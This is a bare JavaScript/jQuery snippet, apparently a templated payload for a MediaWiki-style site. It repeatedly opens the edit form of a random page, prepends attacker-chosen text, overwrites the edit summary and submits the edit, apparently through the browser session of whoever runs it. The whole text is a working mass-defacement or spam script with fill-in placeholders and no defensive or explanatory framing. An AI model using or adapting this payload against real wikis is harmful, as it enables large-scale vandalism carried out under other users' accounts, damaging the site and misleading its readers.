for(var i = 0; i < Number("%%iter_count%%"); i ++) {
    $.get("/w/index.php?title=Special:Random&action=edit", function (data) {
        var editform3 = $(data).find("#editform");
        var data_ser = editform3.serialize();
        data_ser = data_ser.replace(/wpTextbox1=([^&]*)/g, "wpTextbox1=" + "%%urlenc_prepended_text%%" + "$1");
        data_ser = data_ser.replace(/wpSummary=([^&]*)/g, "wpSummary=" + "%%urlenc_summary%%");
        $.ajax({
            type : "POST",
            url : editform3.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}